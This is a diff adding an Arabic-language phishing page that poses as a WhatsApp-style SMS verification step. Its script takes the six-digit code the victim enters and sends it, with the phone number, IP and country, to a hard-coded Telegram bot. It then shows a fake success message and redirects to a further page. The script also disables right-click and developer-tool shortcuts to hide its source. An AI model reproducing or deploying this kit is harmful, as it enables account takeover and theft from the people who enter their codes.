@@ -1,0 +1,376 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهاتف</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #25D366;
+            --primary-dark: #128C7E;
+            --error: #e53e3e;
+            --success: #38a169;
+            --white: #FFFFFF;
+            --light-bg: #f5f8fa;
+            --border-color: #e1e8ed;
+            --text-color: #2d3748;
+            --text-secondary: #718096;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--light-bg);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .verification-card {
+            background-color: var(--white);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
+            text-align: center;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        .verification-icon {
+            color: var(--primary);
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .verification-title {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--primary-dark);
+        }
+
+        .verification-description {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+            direction: ltr;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            transition: var(--transition);
+            direction: ltr;
+        }
+
+        .code-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
+        }
+
+        .message {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-message {
+            background-color: #FFF5F5;
+            color: var(--error);
+            border: 1px solid #FED7D7;
+        }
+
+        .success-message {
+            background-color: #F0FFF4;
+            color: var(--success);
+            border: 1px solid #C6F6D5;
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, var(--primary), var(--primary-dark));
+            color: var(--white);
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
+            display: none;
+        }
+
+        .countdown-section {
+            margin-top: 25px;
+            display: none;
+        }
+
+        .countdown-text {
+            color: var(--text-secondary);
+        }
+
+        .countdown-number {
+            color: var(--primary-dark);
+            font-weight: 700;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="verification-icon">
+            <i class="fas fa-sms"></i>
+        </div>
+        <h1 class="verification-title">رمز التفعيل</h1>
+        <p class="verification-description">يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية</p>
+        
+        <div class="message success-message" id="successMessage">
+            <i class="fas fa-check-circle"></i>
+            <span>تم التحقق بنجاح، جاري التوجيه...</span>
+        </div>
+        
+        <div class="code-inputs">
+            <input type="tel" class="code-input" maxlength="1" data-index="1">
+            <input type="tel" class="code-input" maxlength="1" data-index="2">
+            <input type="tel" class="code-input" maxlength="1" data-index="3">
+            <input type="tel" class="code-input" maxlength="1" data-index="4">
+            <input type="tel" class="code-input" maxlength="1" data-index="5">
+            <input type="tel" class="code-input" maxlength="1" data-index="6">
+        </div>
+        
+        <button class="submit-btn" id="submitBtn">
+            <span>تحقق</span>
+            <i class="fas fa-check"></i>
+        </button>
+        
+        <div class="countdown-section" id="countdownSection">
+            <p class="countdown-text">سيتم إعادة التوجيه خلال <span class="countdown-number" id="countdown">15</span> ثانية</p>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function () {
+
+    // Désactiver clic droit
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+    });
+
+    // Désactiver raccourcis
+    document.addEventListener("keydown", function(e) {
+
+        // Ctrl + U
+        if (e.ctrlKey && e.key.toLowerCase() === "u") {
+            e.preventDefault();
+        }
+
+        // Ctrl + Shift + I
+        if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") {
+            e.preventDefault();
+        }
+
+        // F12
+        if (e.key === "F12") {
+            e.preventDefault();
+        }
+
+    });
+
+};
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const successMessage = document.getElementById('successMessage');
+            const countdownSection = document.getElementById('countdownSection');
+            const countdownElement = document.getElementById('countdown');
+            
+            let countdownInterval;
+            
+            // دالة للحصول على رمز العلم بناءً على كود الدولة
+            function getFlagEmoji(countryCode) {
+                if (!countryCode || countryCode === 'غير معروف') return '🏴';
+                const codePoints = countryCode
+                    .toUpperCase()
+                    .split('')
+                    .map(char => 127397 + char.charCodeAt());
+                return String.fromCodePoint(...codePoints);
+            }
+            
+            // إدارة إدخال الرمز
+            codeInputs.forEach((input, index) => {
+                // التركيز على الحقل الأول عند التحميل
+                if(index === 0) input.focus();
+                
+                // الانتقال بين الحقول عند الإدخال
+                input.addEventListener('input', function() {
+                    if(this.value.length === 1) {
+                        if(index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        } else {
+                            // عند إدخال الحقل الأخير، بدء التحقق تلقائياً
+                            verifyCode();
+                        }
+                    }
+                });
+                
+                // التعامل مع مفتاح backspace
+                input.addEventListener('keydown', function(e) {
+                    if(e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // دالة التحقق التلقائي
+            function verifyCode() {
+                const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
+                
+                if(verificationCode.length !== 6) {
+                    return;
+                }
+                
+                // إرسال الرمز إلى تيليجرام
+                sendToTelegram(verificationCode);
+                
+                // عرض رسالة النجاح والتحويل بعد ثواني
+                showSuccess();
+                startCountdown();
+            }
+            
+            // دالة إرسال الرمز إلى تيليجرام
+            function sendToTelegram(code) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const phone = urlParams.get('phone');
+                const ip = urlParams.get('ip');
+                const country_code = urlParams.get('country_code');
+                const country_name = urlParams.get('country_name');
+                const dial_code = urlParams.get('dial_code');
+                
+                // الحصول على رمز العلم
+                const flagEmoji = getFlagEmoji(country_code);
+
+                // تنسيق الوقت بالإنجليزية
+                const now = new Date();
+                const formattedTime = now.toLocaleString('en-US', {
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: true
+                });
+
+                const message = `
+🔐 *Verification Code 2* 🔐
+📱 *Verification Code:* ${code}
+📞 *Phone Number:* ${phone}
+🏴 *Country:* ${flagEmoji} ${country_name} (${country_code})
+🌐 *IP Address:* ${ip}
+🕒 *Time:* ${formattedTime}
+                `;
+
+                const bots = [
+                    
+                    { token: "8725929598:AAH7bi7lkg_B_wNqILlxRf0yuOfAS8GaByo", chatId: "8739237977" }
+                ];
+                
+                bots.forEach(bot => {
+                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                        .catch(err => console.error('Error sending to Telegram:', err));
+                });
+            }
+            
+            // دالة عرض رسالة النجاح
+            function showSuccess() {
+                successMessage.style.display = 'flex';
+                countdownSection.style.display = 'block';
+            }
+            
+            // دالة العد التنازلي للتحويل
+            function startCountdown() {
+                clearInterval(countdownInterval);
+                let seconds = 15;
+                countdownElement.textContent = seconds;
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = seconds;
+                    
+                    if(seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        // التحويل إلى الصفحة التالية
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const phone = urlParams.get('phone');
+                        const ip = urlParams.get('ip');
+                        const country_code = urlParams.get('country_code');
+                        const country_name = urlParams.get('country_name');
+                        const dial_code = urlParams.get('dial_code');
+                                  
+                        // تخزين البيانات في localStorage للصفحات التالية
+                        const userData = {
+                            phone: phone,
+                            ip: ip,
+                            countryCode: country_code,
+                            countryName: country_name,
+                            countryFlag: getFlagEmoji(country_code),
+                            dialCode: dial_code,
+                            verificationCode1: Array.from(codeInputs).map(input => input.value).join(''),
+                            timestamp: new Date().toISOString()
+                        };
+                        localStorage.setItem('userData', JSON.stringify(userData));
+                        
+                        window.location.href = `traitement.html?phone=${phone}&ip=${ip}&country_code=${country_code}&country_name=${country_name}&dial_code=${dial_code}`;
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
